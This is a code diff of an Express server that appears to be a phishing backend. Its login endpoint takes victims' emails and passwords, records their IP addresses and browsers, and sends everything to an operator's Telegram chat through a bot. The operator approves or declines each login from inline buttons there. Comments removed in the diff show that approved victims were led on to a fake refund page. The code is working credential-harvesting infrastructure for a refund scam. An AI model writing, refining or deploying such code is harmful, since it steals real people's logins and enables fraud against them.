@@ -18,17 +18,15 @@ const TELEGRAM_CHAT_ID = '7386607055';
 app.use(cors());
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
-
-// Serve static files
 app.use(express.static(path.join(__dirname, 'public')));
 
 // ============================================
-// STORE USER STATUSES (In-memory - use database in production)
+// STORE USER STATUSES (In-memory)
 // ============================================
 const userStatuses = {};
 
 // ============================================
-// TELEGRAM SEND MESSAGE WITH INLINE BUTTONS
+// SEND TELEGRAM MESSAGE WITH APPROVE/DECLINE BUTTONS
 // ============================================
 async function sendTelegramMessageWithButtons(email, password, firstName, ip, userAgent) {
     try {
@@ -87,7 +85,7 @@ async function sendTelegramMessageWithButtons(email, password, firstName, ip, us
 }
 
 // ============================================
-// HANDLE TELEGRAM CALLBACK QUERIES (WEBHOOK)
+// HANDLE TELEGRAM CALLBACK (Admin clicks Approve/Decline)
 // ============================================
 app.post('/api/telegram-callback', async (req, res) => {
     try {
@@ -103,9 +101,8 @@ app.post('/api/telegram-callback', async (req, res) => {
 
         console.log('📨 Callback received:', data);
 
-        // Parse the callback data
         const parts = data.split('_');
-        const action = parts[0]; // 'approve' or 'decline'
+        const action = parts[0];
         const email = parts.slice(1, -1).join('_');
         const firstName = parts[parts.length - 1];
 
@@ -124,9 +121,8 @@ app.post('/api/telegram-callback', async (req, res) => {
 👤 <b>Name:</b> ${firstName}
 
 ✅ <i>This login has been approved!</i>
-<i>User will now see the refund page.</i>
             `;
-        } else if (action === 'decline') {
+        } else {
             responseText = `
 ❌ <b>DECLINED</b>
 ━━━━━━━━━━━━━━━━━━━━━━━━━
@@ -135,11 +131,9 @@ app.post('/api/telegram-callback', async (req, res) => {
 👤 <b>Name:</b> ${firstName}
 
 ❌ <i>This login has been declined!</i>
-<i>User will see "Incorrect Credentials" message.</i>
             `;
         }
 
-        // Edit the original message to show the result
         const editUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`;
         await axios.post(editUrl, {
             chat_id: chatId,
@@ -160,11 +154,7 @@ app.post('/api/telegram-callback', async (req, res) => {
 // HEALTH CHECK
 // ============================================
 app.get('/health', (req, res) => {
-    res.json({
-        status: 'OK',
-        timestamp: new Date().toISOString(),
-        message: 'Server is running!'
-    });
+    res.json({ status: 'OK', timestamp: new Date().toISOString() });
 });
 
 // ============================================
@@ -200,10 +190,8 @@ app.post('/api/login', async (req, res) => {
 
         console.log(`📧 Login attempt: ${email}`);
 
-        // Extract first name from email
         const firstName = email.split('@')[0] || 'User';
 
-        // Get IP and User Agent
         const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';
         const userAgent = req.headers['user-agent'] || 'Unknown';
 
@@ -216,11 +204,11 @@ app.post('/api/login', async (req, res) => {
 
         console.log('✅ Telegram notification with buttons sent');
 
-        // ✅ Redirect to pending page with status=pending
+        // ✅ Return success - User STAYS on login page and checks status
         return res.json({
             success: true,
-            message: 'Login successful! Waiting for admin approval...',
-            redirect: `/refund-pending.html?email=${encodeURIComponent(email)}&name=${encodeURIComponent(firstName)}&status=pending`
+            message: 'Login submitted! Waiting for admin approval...',
+            status: 'pending'
         });
 
     } catch (error) {
